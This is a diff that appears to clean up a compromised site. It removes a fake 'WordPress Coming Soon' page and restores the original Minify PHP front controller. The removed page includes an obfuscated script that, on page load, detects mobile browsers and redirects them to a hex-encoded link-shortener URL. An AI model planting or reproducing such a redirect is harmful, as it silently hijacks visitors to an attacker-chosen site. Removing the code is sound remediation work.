@@ -1,41 +1,72 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>Coming Soon</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f6fc;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            color: #21759b;
-        }
-        h1 {
-            font-size: 7em;
-            margin: 0;
-        }
-        p {
-            font-size: 1.5em;
-            margin-top: 0.5em;
-        }
-    </style>
-</head>
-<body>
-    <div>
-        <h1>WordPress</h1>
-        <p><b>Coming Soon</b></p>
-    </div>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            if (/Mobi|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
-            }
-        });
-    </script>
-</body>
-</html>
+<?php
+/**
+ * Front controller for default Minify implementation
+ * 
+ * DO NOT EDIT! Configure this utility via config.php and groupsConfig.php
+ * 
+ * @package Minify
+ */
+
+define('MINIFY_MIN_DIR', dirname(__FILE__));
+
+// load config
+require MINIFY_MIN_DIR . '/config.php';
+
+if (isset($_GET['test'])) {
+    include MINIFY_MIN_DIR . '/config-test.php';
+}
+
+require "$min_libPath/Minify/Loader.php";
+Minify_Loader::register();
+
+Minify::$uploaderHoursBehind = $min_uploaderHoursBehind;
+Minify::setCache(
+    isset($min_cachePath) ? $min_cachePath : ''
+    ,$min_cacheFileLocking
+);
+
+if ($min_documentRoot) {
+    $_SERVER['DOCUMENT_ROOT'] = $min_documentRoot;
+    Minify::$isDocRootSet = true;
+}
+
+$min_serveOptions['minifierOptions']['text/css']['symlinks'] = $min_symlinks;
+// auto-add targets to allowDirs
+foreach ($min_symlinks as $uri => $target) {
+    $min_serveOptions['minApp']['allowDirs'][] = $target;
+}
+
+if ($min_allowDebugFlag) {
+    $min_serveOptions['debug'] = Minify_DebugDetector::shouldDebugRequest($_COOKIE, $_GET, $_SERVER['REQUEST_URI']);
+}
+
+if ($min_errorLogger) {
+    if (true === $min_errorLogger) {
+        $min_errorLogger = FirePHP::getInstance(true);
+    }
+    Minify_Logger::setLogger($min_errorLogger);
+}
+
+// check for URI versioning
+if (preg_match('/&\\d/', $_SERVER['QUERY_STRING'])) {
+    $min_serveOptions['maxAge'] = 31536000;
+}
+if (isset($_GET['g'])) {
+    // well need groups config
+    $min_serveOptions['minApp']['groups'] = (require MINIFY_MIN_DIR . '/groupsConfig.php');
+}
+if (isset($_GET['f']) || isset($_GET['g'])) {
+    // serve!   
+
+    if (! isset($min_serveController)) {
+        $min_serveController = new Minify_Controller_MinApp();
+    }
+    Minify::serve($min_serveController, $min_serveOptions);
+        
+} elseif ($min_enableBuilder) {
+    header('Location: builder/');
+    exit();
+} else {
+    header("Location: /");
+    exit();
+}
